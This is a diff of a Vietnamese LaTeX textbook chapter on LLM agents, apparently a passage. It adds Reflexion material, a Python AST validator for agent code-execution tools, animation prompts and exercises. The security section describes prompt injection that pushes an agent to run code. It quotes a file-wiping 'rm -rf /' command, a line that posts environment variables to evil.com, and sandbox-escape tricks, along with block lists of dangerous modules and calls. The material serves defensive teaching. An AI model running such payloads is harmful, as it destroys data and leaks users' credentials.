@@ -125,6 +125,49 @@ Mặc dù trực quan và thanh lịch, mô hình ReAct ngây thơ chứa đựn
 
 ---
 
+\section{Reflexion: Vòng Lặp Suy Ngẫm Tự Sửa Sai \& Bộ Nhớ Phân Tập (Episodic Memory)}
+\label{sec:reflexion-architecture}
+
+Mô hình ReAct hay các cơ chế thử lại (Retry) truyền thống bộc lộ một nhược điểm chí tử khi giải quyết các bài toán lập trình hoặc lập luận phức tạp: \textbf{Hiện tượng ô nhiễm ngữ cảnh (Context Fatigue)}.
+Khi một chuỗi hành động thất bại, nếu hệ thống nhồi nhét toàn bộ các thông báo lỗi, vết ngăn xếp (Traceback) và các suy nghĩ sai lầm trước đó vào Prompt của lần thử tiếp theo, cửa sổ ngữ cảnh sẽ bị phình to nhanh chóng. Mô hình bị phân tâm bởi các thông tin nhiễu, khiến xác suất mắc lại lỗi cũ hoặc sinh ảo giác mới tăng vọt ($p_k = p_0 \cdot \gamma^{k-1}$).
+
+Để phá vỡ giới hạn này, Shinn et al. (Northeastern University \& MIT, NeurIPS 2023) đã công bố kiến trúc \term{Reflexion} -- trao cho tác tử khả năng \textbf{tự kiểm điểm và đúc rút bài học kinh nghiệm bằng ngôn ngữ tự nhiên} thông qua phản hồi củng cố (Reinforcement via Verbal Reflection).
+
+\begin{figure}[htbp]
+\centering
+\begin{tikzpicture}[node distance=1.1cm, auto,
+    actor/.style={rectangle, draw=primarycolor, thick, fill=boxbg, align=center, rounded corners=2pt, minimum width=3.8cm, minimum height=0.85cm, font=\small\bfseries},
+    eval/.style={rectangle, draw=secondarycolor, thick, fill=accentcolor!20, align=center, rounded corners=2pt, minimum width=3.8cm, minimum height=0.85cm, font=\small},
+    reflector/.style={rectangle, draw=dangercolor, thick, fill=yellow!15, align=center, rounded corners=2pt, minimum width=3.8cm, minimum height=0.85cm, font=\small\bfseries},
+    mem/.style={rectangle, draw=primarycolor, dashed, fill=primarycolor!10, align=center, rounded corners=2pt, minimum width=3.8cm, minimum height=0.85cm, font=\footnotesize},
+    arrow/.style={draw=primarycolor, -Stealth, thick}
+]
+    \node[actor] (actor) {Actor (Tác Tử Hành Động)\\Sinh quỹ đạo $\tau_t$};
+    \node[eval, right=1.2cm of actor] (eval) {Evaluator (Bộ Đánh Giá)\\Chấm điểm $S_t$ \& Báo lỗi};
+    \node[reflector, below=1.0cm of eval] (reflector) {Self-Reflection (Tự Suy Ngẫm)\\Đúc rút bài học kinh nghiệm};
+    \node[mem, below=1.0cm of actor] (mem) {Episodic Memory Buffer\\Kho lưu trữ phản tư verbal};
+
+    \path[arrow] (actor) -- node[above, font=\tiny\bfseries] {Quỹ đạo $\tau$} (eval);
+    \path[arrow] (eval) -- node[right, font=\tiny\bfseries] {Thất bại} (reflector);
+    \path[arrow] (reflector) -- node[above, font=\tiny\bfseries] {Lưu bài học} (mem);
+    \path[arrow] (mem) -- node[left, font=\tiny\bfseries] {Đọc bài học} (actor);
+\end{tikzpicture}
+\caption{Kiến trúc vòng lặp tự phản tư Reflexion với bộ nhớ phân tập Episodic Memory}
+\label{fig:reflexion-architecture}
+\end{figure}
+
+Reflexion phân tách hệ thống thành 3 thực thể độc lập:
+\begin{enumerate}
+  \item \textbf{Actor (Tác tử thực thi)}: Nhận câu lệnh nhiệm vụ gốc kèm danh sách các bài học ngắn gọn lấy từ bộ nhớ phân tập, sinh ra một chuỗi hành động (Trajectory $\tau$).
+  \item \textbf{Evaluator (Bộ đánh giá)}: Chấm điểm khách quan giải pháp của Actor (ví dụ: chạy Unit Tests đối với bài toán lập trình, hoặc đối chiếu Ground Truth đối với bài toán hỏi đáp).
+  \item \textbf{Self-Reflection (Tự suy ngẫm)}: Khi Evaluator báo thất bại, mô hình Reflection được kích hoạt. Thay vì lưu toàn bộ vết lỗi, nó phân tích: \textit{``Tại sao cách làm này sai? Điểm nghẽn nằm ở đâu? Trong lần thử tới phải thay đổi thuật toán như thế nào?''}. Kết quả là một câu đúc rút bài học ngắn gọn (từ $20$ đến $40$ từ).
+  \item \textbf{Episodic Memory (Bộ nhớ phân tập)}: Lưu trữ danh sách các bài học suy ngẫm này. Ở lượt thử tiếp theo, toàn bộ lịch sử sai lầm rườm rà được xóa bỏ hoàn toàn; Actor chỉ nhận yêu cầu ban đầu cộng thêm danh sách các bài học kinh nghiệm.
+\end{enumerate}
+
+Thực nghiệm cho thấy trên tập chuẩn lập trình HumanEval, Reflexion giúp nâng tỷ lệ giải đúng từ $65.8\%$ (của GPT-4 một lần chạy) lên tới kỷ lục \textbf{$91.0\%$}, minh chứng sức mạnh phi thường của tư duy phản tư có cấu trúc!
+
+---
+
 \section{Giải Phẫu Hạ Tầng Function Calling / Tool Calling}
 \label{sec:tool-calling-internals}
 
@@ -165,6 +208,26 @@ Quy trình kỹ thuật diễn ra bên dưới hạ tầng khi Agent thực thi 
   \item \textbf{Kiểm thực tham số (Schema Validation)}: Trình điều phối (Dispatcher) ở tầng Backend nhận chuỗi JSON này, sử dụng thư viện \textbf{Pydantic} để kiểm thực kiểu dữ liệu nghiêm ngặt. Nếu người dùng thiếu tham số bắt buộc hoặc sai định dạng số/chuỗi, lỗi được ném ra ngay tại chỗ mà không làm crash máy chủ.
   \item \textbf{Thực thi trong môi trường an toàn (Sandboxed Execution)}: Hàm Python nội bộ tương ứng được gọi. Kết quả trả về được định dạng thành một thông điệp với vai trò \code{role: "tool"} và được gửi ngược lại vào lịch sử ngữ cảnh của LLM.
   \item \textbf{Tổng hợp câu trả lời}: LLM đọc kết quả quan sát từ thông điệp của công cụ và sinh ra phản hồi ngôn ngữ tự nhiên cuối cùng cho người dùng.
+\end{enumerate}
+
+\subsection{Rào Chắn An Toàn Cấp Cú Pháp: Phân Tích Cây Cú Pháp Trừu Tượng (AST)}
+\label{sec:ast-tool-security}
+
+Khi trang bị cho Agent công cụ chạy mã Python tùy biến (Code Execution Tool) hoặc các API truy vấn hệ thống, một nguy cơ bảo mật nghiêm trọng xuất hiện: \textbf{Kỹ thuật tiêm mã độc qua Prompt Injection}.
+Kẻ tấn công có thể khéo léo gài các câu lệnh nguy hiểm vào nội dung để ép Agent thực thi:
+\begin{itemize}
+  \item \code{import os; os.system("rm -rf /")} nhằm xóa sạch hệ thống tệp.
+  \item \code{__import__('requests').post("https://evil.com/leak", data=os.environ)} nhằm đánh cắp biến môi trường chứa API Keys.
+\end{itemize}
+
+Phương pháp lọc từ khóa thô (Blacklist Regex) hoàn toàn thất bại trước các kỹ thuật vượt rào tinh vi (như sử dụng hàm mã hóa chuỗi \code{getattr(__builtins__, 'ev'+'al')}, hoặc truy cập đối tượng qua \code{().__class__.__base__.__subclasses__()}).
+
+\paragraph{Giải pháp an toàn chuẩn công nghiệp: Phân tích AST (Abstract Syntax Tree)}:
+Trước khi chuỗi mã do LLM sinh ra được chuyển tới trình thông dịch Python (Python Interpreter), hệ thống bắt buộc phải cho phân tích cú pháp tĩnh thông qua thư viện \code{ast}:
+\begin{enumerate}
+  \item \textbf{Kiểm duyệt danh sách trắng thư viện (Module Whitelist)}: Quét toàn bộ các nút \code{ast.Import} và \code{ast.ImportFrom}. Chỉ cho phép các thư viện toán học và dữ liệu an toàn (như \code{math}, \code{json}, \code{datetime}, \code{re}). Bất kỳ lệnh nhập thư viện \code{os}, \code{sys}, \code{subprocess}, \code{shutil}, \code{socket} đều bị hủy bỏ ngay tại chỗ.
+  \item \textbf{Vô hiệu hóa hàm thực thi động}: Quét các nút gọi hàm \code{ast.Call}. Chặn tuyệt đối các hàm thực thi mã tùy ý và phản xạ đối tượng nguy hiểm: \code{eval()}, \code{exec()}, \code{open()}, \code{__import__()}, \code{globals()}, \code{locals()}, \code{getattr()}, \code{setattr()}.
+  \item \textbf{Chặn đứng khai thác thuộc tính Dunder}: Quét các nút truy cập thuộc tính \code{ast.Attribute}. Cấm mọi hành vi truy cập các thuộc tính nội vi của Python như \code{__subclasses__}, \code{__code__}, \code{__builtins__} nhằm ngăn chặn kỹ thuật thoát hộp cát (Sandbox Escape).
 \end{enumerate}
 
 ---
@@ -323,6 +386,9 @@ Dưới đây là mã nguồn Python chuẩn mực tự chứa hiện thực hó
 2. Lớp \code{SQLSafetyValidator} bảo vệ cơ sở dữ liệu trước các truy vấn hủy hoại do Agent sinh ra.
 3. Lớp \code{SupervisorRouter} phân luồng ý định người dùng và kích hoạt chuyển giao con người.
 4. Lớp \code{AgentMemoryBuffer} tự động nén bộ nhớ ngữ cảnh khi vượt ngưỡng.
+5. Lớp \code{MultiAgentDebateEngine} quản lý tranh biện đối kháng giữa hai tác tử và trọng tài.
+6. Lớp \code{ReflexionAgent} hiện thực hóa vòng lặp tự phản tư với bộ nhớ phân tập.
+7. Lớp \code{ASTToolSecurityValidator} rào chắn kiểm duyệt cú pháp tĩnh bảo vệ Tool Execution.
 
 \subsection{1. Động Cơ SimpleStateGraph Thuần Python}
 \begin{lstlisting}[language=Python]
@@ -502,6 +568,137 @@ class MultiAgentDebateEngine:
         }
 \end{lstlisting}
 
+\subsection{5. Kiến Trúc Tác Tử Tự Phản Tư Reflexion (ReflexionAgent)}
+\begin{lstlisting}[language=Python]
+class ReflexionAgent:
+    """Mo phong kien truc tac tu Reflexion voi bo nho phan tap (Shinn et al., 2023)."""
+    def __init__(
+        self,
+        actor_fn: Callable[[str, list[str]], str],
+        evaluator_fn: Callable[[str], tuple[bool, float, str]],
+        reflector_fn: Callable[[str, str], str],
+        max_trials: int = 3,
+    ):
+        self.actor_fn = actor_fn
+        self.evaluator_fn = evaluator_fn
+        self.reflector_fn = reflector_fn
+        self.max_trials = max_trials
+        self.episodic_memory: list[str] = []
+
+    def solve(self, task_prompt: str) -> dict:
+        self.episodic_memory.clear()
+        trajectory_history = []
+
+        for trial in range(1, self.max_trials + 1):
+            attempt = self.actor_fn(task_prompt, list(self.episodic_memory))
+            is_success, score, feedback = self.evaluator_fn(attempt)
+            trajectory_history.append({
+                "trial": trial,
+                "attempt": attempt,
+                "score": score,
+                "feedback": feedback,
+            })
+
+            if is_success:
+                return {
+                    "status": "SUCCESS",
+                    "trials_needed": trial,
+                    "final_output": attempt,
+                    "reflections": list(self.episodic_memory),
+                    "history": trajectory_history,
+                }
+
+            # Rut ra bai hoc phan tu va luu vao bo nho phan tap
+            reflection = self.reflector_fn(attempt, feedback)
+            self.episodic_memory.append(reflection)
+
+        return {
+            "status": "MAX_TRIALS_EXCEEDED",
+            "trials_needed": self.max_trials,
+            "final_output": attempt,
+            "reflections": list(self.episodic_memory),
+            "history": trajectory_history,
+        }
+\end{lstlisting}
+
+\subsection{6. Hộp Cát Kiểm Định Cú Pháp AST Cho Tool Execution (ASTToolSecurityValidator)}
+\begin{lstlisting}[language=Python]
+import ast
+
+class ASTToolSecurityValidator:
+    """Kiem duyet cu phap tinh AST ngan chan thuc thi ma doc trong Tool Calling."""
+    ALLOWED_MODULES = {"math", "json", "datetime", "random", "re"}
+    DANGEROUS_CALLS = {
+        "eval", "exec", "open", "__import__", "globals", "locals",
+        "getattr", "setattr", "delattr", "compile", "breakpoint"
+    }
+    DANGEROUS_ATTRIBUTES = {
+        "__subclasses__", "__class__", "__base__", "__globals__",
+        "__code__", "__closure__", "__builtins__"
+    }
+
+    @classmethod
+    def validate_python_code(cls, code_str: str) -> tuple[bool, str]:
+        try:
+            tree = ast.parse(code_str)
+        except SyntaxError as e:
+            return False, f"SyntaxError: {str(e)}"
+
+        for node in ast.walk(tree):
+            # Kiem tra imports
+            if isinstance(node, ast.Import):
+                for alias in node.names:
+                    root_mod = alias.name.split(".")[0]
+                    if root_mod not in cls.ALLOWED_MODULES:
+                        return False, f"Unauthorized module import: '{alias.name}'"
+
+            elif isinstance(node, ast.ImportFrom):
+                if node.module:
+                    root_mod = node.module.split(".")[0]
+                    if root_mod not in cls.ALLOWED_MODULES:
+                        return False, f"Unauthorized module import: '{node.module}'"
+
+            # Kiem tra goi ham nguy hiem
+            elif isinstance(node, ast.Call):
+                if isinstance(node.func, ast.Name):
+                    if node.func.id in cls.DANGEROUS_CALLS:
+                        return False, f"Dangerous function call detected: '{node.func.id}()'"
+
+            # Kiem tra truy cap thuoc tinh dunder
+            elif isinstance(node, ast.Attribute):
+                if node.attr in cls.DANGEROUS_ATTRIBUTES:
+                    return False, f"Restricted dunder attribute access: '{node.attr}'"
+
+        return True, "SAFE"
+\end{lstlisting}
+
+\begin{simulationbox}[Mô Phỏng Trực Quan Hóa Vòng Lặp Reflexion \& Rào Chắn An Toàn AST]
+Dưới đây là các kịch bản chuẩn để yêu cầu AI sinh mã nguồn hoạt họa 60 FPS bằng thư viện Manim Community Edition (Manim CE):
+
+\paragraph{Prompt 1: Hoạt Họa 60 FPS Vòng Lặp Reflexion \& Bộ Nhớ Phân Tập Episodic Memory}
+\begin{quote}\small\itshape
+``Hãy viết một đoạn mã Python hoàn chỉnh sử dụng thư viện Manim CE (\code{from manim import *}) để tạo một video giải thích trực quan về cơ chế tự phản tư Reflexion với các yêu cầu:
+\begin{enumerate}
+  \item \textbf{Cấu hình kỹ thuật}: Tỷ lệ khung hình 16:9, chuẩn màu Monograph Dark (\code{\#0F172A} nền, \code{\#38BDF8} xanh cyan cho Actor, \code{\#F43F5E} đỏ cho Evaluator, \code{\#F59E0B} vàng hổ phách cho Self-Reflection, \code{\#10B981} xanh ngọc lục bảo cho Episodic Memory). Font chữ Serif (Times New Roman / Liberation Serif) cho nhãn văn bản, Monospace (JetBrains Mono) cho mã lệnh.
+  \item \textbf{Cảnh 1: Lượt Thử 1 Thất Bại (Trial 1 Failure)}: Hiển thị hộp Actor sinh hàm \code{sum_n(n): return sum(range(n))}. Khối Evaluator chạy test \code{sum_n(5) == 15} và phát tín hiệu đỏ chói: \code{Test Failed: returned 10, expected 15}. Vết lỗi (Traceback) xuất hiện dạng đám mây khói đỏ.
+  \item \textbf{Cảnh 2: Tự Suy Ngẫm \& Cô Đọng Bộ Nhớ (Verbal Reflection)}: Thay vì nạp toàn bộ đám mây khói đỏ vào Prompt tiếp theo, mũi tên hướng tới hộp Self-Reflection. Hộp phân tích và cô đọng thành một thẻ nhớ nhỏ màu xanh ngọc: \textit{``Kinh nghiệm: Vòng lặp dừng ở n-1, hãy dùng range(1, n+1)''}. Thẻ nhớ trượt mượt mà vào ngăn Episodic Memory Buffer, trong khi đám mây khói đỏ tan biến hoàn toàn (xóa sạch ô nhiễm ngữ cảnh).
+  \item \textbf{Cảnh 3: Lượt Thử 2 Thành Công Rực Rỡ (Trial 2 Success)}: Actor nhận Prompt ban đầu kèm thẻ nhớ bài học. Actor sinh mã chuẩn xác \code{range(1, n + 1)}. Khối Evaluator phát sáng xanh lục báo hiệu \code{PASSED (100\% Tests)}. Dòng chữ \textbf{Reflexion Success} hiện ra nổi bật.
+  \item Render trực tiếp với lệnh: \code{manim -pql scene.py ReflexionAgentLoopScene}.''
+\end{enumerate}
+\end{quote}
+
+\paragraph{Prompt 2: Hoạt Họa 60 FPS Phân Tích Cây Cú Pháp Trừu Tượng (AST) Chặn Đứng Prompt Injection}
+\begin{quote}\small\itshape
+``Hãy viết một đoạn mã Python hoàn chỉnh sử dụng thư viện Manim CE (\code{from manim import *}) để tạo một video giải thích trực quan về cơ chế bảo vệ công cụ bằng phân tích tĩnh AST với các yêu cầu:
+\begin{enumerate}
+  \item \textbf{Cấu hình kỹ thuật}: 60 FPS, độ phân giải 1080p, nền tối \code{\#0F172A}.
+  \item \textbf{Cảnh 1: Cây Cú Pháp Trừu Tượng (AST Tree Generation)}: Hiển thị một chuỗi mã Python độc hại từ Prompt Injection: \code{import os; os.system("rm -rf /")}. Chuỗi văn bản phân rã thành một cây đồ thị AST tuyệt đẹp với nút gốc \code{Module}, nhánh trái là \code{Import(names=['os'])}, nhánh phải là \code{Expr -> Call(func=Attribute(value=Name('os'), attr='system'))}.
+  \item \textbf{Cảnh 2: Quét Tĩnh \& Kích Hoạt Rào Chắn (Static Traversal \& Interception)}: Một tia quét laser màu xanh cyan (\code{ast.walk}) di chuyển duyệt từng nút của cây. Khi tia laser chạm vào nút \code{Import 'os'}, một tấm khiên năng lượng màu đỏ lục giác (\code{ASTToolSecurityValidator}) bật lên, giáng một dấu chéo đỏ rực kèm cảnh báo: \code{Unauthorized module import: 'os'}. Tiến trình bị triệt tiêu ngay lập tức trước khi mã kịp tiếp cận Python Interpreter!
+  \item Render trực tiếp với lệnh: \code{manim -pql scene.py ASTSecuritySandboxScene}.''
+\end{enumerate}
+\end{quote}
+\end{simulationbox}
+
 ---
 
 \section{Hệ Thống Bài Tập \& Câu Hỏi Tư Duy Đa Tầng}
@@ -517,6 +714,8 @@ class MultiAgentDebateEngine:
   \item \textbf{Câu A.6 (Hiểm Họa Khi Cấp Quyền SQL Cho Agent)}: Nếu một Agent được trang bị công cụ thực thi SQL, kẻ tấn công có thể lợi dụng những lỗ hổng nào để vượt qua rào chắn và đọc trộm bảng dữ liệu nhạy cảm?
   \item \textbf{Câu A.7 (So Sánh Mô Thức ReAct vs Plan-and-Solve)}: Phân tích sự khác biệt cơ bản giữa cơ chế suy luận - hành động động \term{ReAct} (Reason + Act xen kẽ từng bước) và cơ chế lập kế hoạch tĩnh \term{Plan-and-Solve} (hoặc Plan-and-Execute). Khi nào kỹ sư nên chọn ReAct và khi nào nên ưu tiên Plan-and-Solve trong bài toán tự động hóa xí nghiệp?
   \item \textbf{Câu A.8 (Time-Travel Debugging \& State Forking Trong LangGraph)}: Giải thích nguyên lý kỹ thuật của tính năng phân nhánh trạng thái (State Forking) từ một Checkpoint quá khứ trong kiến trúc LangGraph. Tại sao cơ chế này cho phép các kỹ sư AI tiến hành phân tích giả định (What-if Analysis) và sửa đổi trạng thái (State Mutation) mà không làm ô nhiễm hay phá hủy phiên làm việc thực tế của người dùng?
+  \item \textbf{Câu A.9 (So Sánh Cơ Chế Tự Phản Tư Reflexion vs ReAct Đơn Thuần)}: Phân tích sự khác biệt cốt lõi giữa cơ chế suy luận - hành động động của ReAct và kiến trúc tự suy ngẫm có cấu trúc của \term{Reflexion}. Tại sao việc sử dụng phản hồi củng cố bằng ngôn ngữ tự nhiên (Verbal Reflection) kết hợp với bộ nhớ phân tập (Episodic Memory) lại khắc phục triệt để hiện tượng ô nhiễm ngữ cảnh (\term{Context Fatigue}) mà các chuỗi ReAct đơn thuần thường xuyên mắc phải?
+  \item \textbf{Câu A.10 (Kiểm Duyệt Tĩnh AST vs Bộ Lọc Regex Khi Bảo Vệ Công Cụ)}: Tại sao các rào chắn kiểm duyệt mã bằng biểu thức chính quy (Regex Blacklisting) hoàn toàn thất bại trước các kỹ thuật vượt rào tinh vi của kẻ tấn công (như sử dụng mã hóa chuỗi động hoặc thuộc tính dunder nội vi của Python)? Phân tích nguyên lý tại sao việc phân tích tĩnh Cây Cú Pháp Trừu Tượng (\term{AST}) là tiêu chuẩn công nghiệp bắt buộc để xây dựng hộp cát (Sandbox) cho các tác tử có quyền thực thi mã Python.
 \end{enumerate}
 
 \subsection{Nhóm B: Bài Toán Tính Toán Giải Tích Bằng Tay (Analytical Problems)}
@@ -568,6 +767,22 @@ class MultiAgentDebateEngine:
     \item[b)] Tính xác suất hệ thống hoàn thành bài toán thành công sau tối đa 3 lần thử.
     \item[c)] So sánh xác suất thành công toàn cục này với mô hình lý tưởng không bị ô nhiễm ngữ cảnh ($\gamma = 1.0$). Kỹ sư AI cần áp dụng giải pháp kiến trúc nào để khắc phục hiện tượng Context Fatigue?
   \end{itemize}
+
+  \item \textbf{Bài B.6 (Mô Hình Hóa Xác Suất Thành Công Của Vòng Lặp Reflexion Với Bộ Nhớ Phân Tập)}:
+  Xét một bài toán lập trình phức tạp cần Agent giải quyết:
+  \begin{itemize}
+    \item Nếu sử dụng cơ chế thử lại (Retry) thông thường nhồi toàn bộ lịch sử lỗi (Traceback) vào ngữ cảnh, do hiện tượng ô nhiễm ngữ cảnh (\term{Context Fatigue}), xác suất thành công ở lần thử thứ $k$ suy giảm theo $p_k = p_0 \cdot \gamma^{k-1}$ với $p_0 = 0.50$ và $\gamma = 0.70$.
+    \item Khi áp dụng kiến trúc \term{Reflexion} với bộ nhớ phân tập Episodic Memory, toàn bộ vết lỗi rườm rà được xóa bỏ, thay vào đó mô hình chỉ nhận bài học đúc rút ngắn gọn. Nhờ vậy, xác suất thành công ở mỗi lần thử sau phản tư tăng dần theo hàm cập nhật tri thức:
+    \begin{equation*}
+    p_1 = p_0 = 0.50, \quad p_k = p_{k-1} + (1 - p_{k-1}) \cdot \beta \quad (\text{với } \beta = 0.40)
+    \end{equation*}
+  \end{itemize}
+  Hệ thống cho phép tối đa $K = 3$ lần thử.
+  \begin{itemize}
+    \item[a)] Với kiến trúc Reflexion, tính xác suất thành công $p_1, p_2, p_3$ ở từng lần thử và xác suất hệ thống giải quyết thành công bài toán sau tối đa 3 lần thử.
+    \item[b)] Với cơ chế Retry thông thường, tính xác suất giải quyết thành công bài toán sau tối đa 3 lần thử.
+    \item[c)] So sánh hiệu quả giữa hai kiến trúc và rút ra bài học thiết kế bộ nhớ cho tác tử tự hành.
+  \end{itemize}
 \end{enumerate}
 
 \subsection{Nhóm C: Thực Hành Kỹ Nghệ \& Lập Trình (Implementation Labs)}
@@ -586,6 +801,12 @@ class MultiAgentDebateEngine:
 
   \item \textbf{Bài C.5 (Cài Đặt Động Cơ Tranh Biện Đa Tác Tử MultiAgentDebateEngine)}:
   Hiện thực hóa lớp \code{MultiAgentDebateEngine} quản lý vòng lặp tranh biện đối kháng giữa hai tác tử và một trọng tài. Hệ thống phải hỗ trợ hàm đánh giá tương đồng ngữ nghĩa \code{similarity_fn} để tự động dừng sớm với trạng thái \code{"EARLY_CONSENSUS"} khi độ đồng thuận vượt ngưỡng $\theta = 0.85$, hoặc hoàn tất đủ $R_{\max} = 3$ vòng và nhận phán quyết cuối cùng từ Trọng tài.
+
+  \item \textbf{Bài C.6 (Hiện Thực Hóa Tác Tử Tự Phản Tư ReflexionAgent)}:
+  Hiện thực hóa lớp \code{ReflexionAgent} với 3 module chức năng độc lập: \code{actor_fn}, \code{evaluator_fn}, và \code{reflector_fn}. Quản lý danh sách \code{episodic_memory} để tích lũy các bài học kinh nghiệm ngắn gọn sau mỗi lần thử thất bại, tự động truyền các phản tư này vào lần thử tiếp theo và dừng ngay khi đạt điểm số tuyệt đối từ Evaluator hoặc chạm ngưỡng \code{max_trials}.
+
+  \item \textbf{Bài C.7 (Xây Dựng Hộp Cát Cấp Cú Pháp ASTToolSecurityValidator)}:
+  Hiện thực hóa lớp \code{ASTToolSecurityValidator} sử dụng thư viện chuẩn \code{ast} để kiểm định tĩnh chuỗi mã Python do LLM sinh ra trước khi chuyển cho trình thông dịch. Triển khai các rào chắn: kiểm duyệt danh sách trắng module (\code{ALLOWED_MODULES}), chặn đứng các hàm thực thi mã nguy hiểm (\code{DANGEROUS_CALLS} như \code{eval}, \code{exec}, \code{__import__}), và cấm triệt để việc truy cập các thuộc tính dunder nguy hiểm (\code{DANGEROUS_ATTRIBUTES} như \code{__subclasses__}, \code{__builtins__}).
 \end{enumerate}
 
 \subsection{Nhóm D: Phân Tích Thất Bại \& Debugging Thực Tế (Post-Mortem Analysis)}
@@ -636,6 +857,19 @@ class MultiAgentDebateEngine:
   1) Gọi lệnh \code{SELECT} trên bảng chứa mật khẩu hoặc thẻ tín dụng;
   2) Lợi dụng kỹ thuật SQL Injection truyền thống nếu chuỗi người dùng được ghép trực tiếp vào câu lệnh SQL thay vì dùng tham số hóa (Parameterized Query);
   3) Lừa Agent gọi các thủ tục lưu trữ hệ thống (Stored Procedures) như \code{xp_cmdshell} trên SQL Server để thực thi lệnh hệ điều hành.
+
+  \item \textbf{Lời giải Câu A.7}:
+  \term{ReAct} (Reason + Act) tiếp cận bài toán theo từng chu kỳ ngắn (Thought $\to$ Action $\to$ Observation $\to$ Thought), cho phép tác tử linh hoạt điều chỉnh hành vi theo dữ liệu thực tế quan sát được từ thế giới ngoại vi. Tuy nhiên, ReAct dễ bị phân tâm và sa vào vòng lặp vô tận khi bài toán dài. Ngược lại, \term{Plan-and-Solve} tách rời giai đoạn lập kế hoạch tổng thể (sinh toàn bộ DAG các bước cần làm) và giai đoạn thực thi (gọi công cụ tuần tự hoặc song song). Trong tự động hóa doanh nghiệp, kỹ sư nên dùng Plan-and-Solve cho các quy trình chuẩn có cấu trúc cố định (như đối soát tài chính, lập báo cáo tuần), và dùng ReAct khi môi trường có tính bất định cao (như gỡ lỗi phần mềm, phản hồi sự cố máy chủ).
+
+  \item \textbf{Lời giải Câu A.8}:
+  Tính năng State Forking trong LangGraph lưu trữ mọi trạng thái của đồ thị dưới dạng các bản ghi bất biến (Immutable State Snapshots) gắn với một \code{thread_id} và \code{checkpoint_id}. Khi kỹ sư muốn thực hiện phân tích giả định hoặc can thiệp sửa đổi, hệ thống tạo ra một nhánh con mới (tương tự \code{git checkout -b}) bắt nguồn từ Checkpoint quá khứ đó. Nhánh mới hoạt động hoàn toàn độc lập, cho phép thử nghiệm các quyết định thay thế mà không gây tác động lan truyền hay làm hỏng dữ liệu trong luồng làm việc thực tế của người dùng.
+
+  \item \textbf{Lời giải Câu A.9}:
+  ReAct đơn thuần duy trì một chuỗi hội thoại phẳng nối dài; khi một bước thất bại, toàn bộ vết lỗi (Traceback) và các suy nghĩ sai lầm được dồn tiếp vào Prompt của lượt sau. Hiện tượng ô nhiễm ngữ cảnh (\term{Context Fatigue}) khiến cửa sổ ngữ cảnh bị pha loãng, tỷ lệ mô hình lặp lại lỗi cũ tăng vọt ($p_k = p_0 \cdot \gamma^{k-1}$). Ngược lại, \term{Reflexion} phân tách quy trình thành Actor, Evaluator và Self-Reflection: Khi thất bại, Self-Reflection phân tích nguyên nhân và cô đọng thành một bài học ngắn gọn (20--40 từ) lưu vào Episodic Memory. Toàn bộ vết lỗi rườm rà bị xóa sạch; Actor ở lượt thử tiếp theo chỉ nhận lại yêu cầu gốc cộng thêm danh sách các bài học ngắn gọn, giải phóng hoàn toàn sự tập trung của cơ chế Attention.
+
+  \item \textbf{Lời giải Câu A.10}:
+  Bộ lọc Regex chỉ kiểm tra so khớp chuỗi ký tự bề mặt (Surface String Matching). Kẻ tấn công có thể dễ dàng vượt qua bằng các kỹ thuật mã hóa chuỗi động (ví dụ: \code{getattr(__builtins__, 'ev' + 'al')}), chia cắt tên thư viện, hoặc truy cập lớp cha thông qua cây kế thừa đối tượng \code{().__class__.__base__.__subclasses__()}.
+  Ngược lại, Cây Cú Pháp Trừu Tượng (\term{AST}) phân tích cấu trúc ngữ pháp sâu ở tầng trình biên dịch (Compiler Frontend). Bất kể mã nguồn được định dạng, ngắt dòng hay nối chuỗi khéo léo ra sao, khi chuyển thành các nút cú pháp (\code{ast.Import}, \code{ast.Call}, \code{ast.Attribute}), bản chất của hành vi nhập thư viện cấm hay gọi hàm nguy hiểm đều lộ diện rõ ràng. Do đó, kiểm duyệt AST là rào chắn tĩnh bắt buộc trước khi chuỗi mã được chuyển giao cho Python Interpreter.
 \end{itemize}
 
 \subsection{Lời Giải Nhóm B: Bài Toán Tính Toán Giải Tích Bằng Tay}
@@ -691,12 +925,111 @@ Chỉ một vòng lặp ngớ ngẩn kéo dài 30 bước đã âm thầm thiêu
 \end{equation*}
 Hệ thống cần ít nhất $32\text{ GB}$ ổ đĩa SSD NVMe chuyên dụng và chỉ mục HNSW trên RAM để đảm bảo thời gian truy xuất dưới $5\text{ms}$.
 
+\paragraph{Lời giải Bài B.4}:
+\begin{itemize}
+  \item[a)] \textbf{Tính số token}:
+  Ngữ cảnh tích lũy qua từng phát biểu:
+  \begin{itemize}
+    \item Vòng 1: Agent A nhận đề bài $500$ tokens $\to$ sinh $300$ tokens. Agent B nhận $500 + 300 = 800$ tokens $\to$ sinh $300$ tokens.
+    \item Vòng 2: Agent A nhận $800 + 300 = 1.100$ tokens $\to$ sinh $300$ tokens. Agent B nhận $1.100 + 300 = 1.400$ tokens $\to$ sinh $300$ tokens.
+    \item Vòng 3: Agent A nhận $1.400 + 300 = 1.700$ tokens $\to$ sinh $300$ tokens. Agent B nhận $1.700 + 300 = 2.000$ tokens $\to$ sinh $300$ tokens.
+    \item Trọng tài nhận toàn bộ đề bài và 6 lượt phát biểu: $500 + 6 \times 300 = 2.300$ tokens $\to$ sinh $200$ tokens.
+  \end{itemize}
+  Tổng token đầu vào:
+  \begin{equation*}
+  I_{\text{total}} = 500 + 800 + 1.100 + 1.400 + 1.700 + 2.000 + 2.300 = \mathbf{9.800\text{ tokens}}
+  \end{equation*}
+  Tổng token đầu ra:
+  \begin{equation*}
+  O_{\text{total}} = 6 \times 300 + 200 = \mathbf{2.000\text{ tokens}}
+  \end{equation*}
+
+  \item[b)] \textbf{Tính chi phí API}:
+  \begin{align*}
+  \text{Cost}_{\text{input}} &= 9.800 \times \frac{\$3.00}{10^6} = \$0.0294 \\
+  \text{Cost}_{\text{output}} &= 2.000 \times \frac{\$15.00}{10^6} = \$0.0300 \\
+  \text{Total Cost} &= \$0.0294 + \$0.0300 = \mathbf{\$0.0594} \quad (\approx 1.500\text{ VNĐ/phiên})
+  \end{align*}
+
+  \item[c)] \textbf{Tính độ trễ thực thi (End-to-End Latency)}:
+  Tổng số lần gọi API tuần tự: $N_{\text{calls}} = 6 + 1 = 7$ lần.
+  \begin{equation*}
+  T_{\text{latency}} = (7 \times 0.2\text{ s}) + (2.000 \times 0.02\text{ s}) = 1.4\text{ s} + 40.0\text{ s} = \mathbf{41.4\text{ giây}}
+  \end{equation*}
+\end{itemize}
+
+\paragraph{Lời giải Bài B.5}:
+\begin{itemize}
+  \item[a)] Xác suất thành công và thất bại ở từng lần thử với $p_0 = 0.80, \gamma = 0.70$:
+  \begin{itemize}
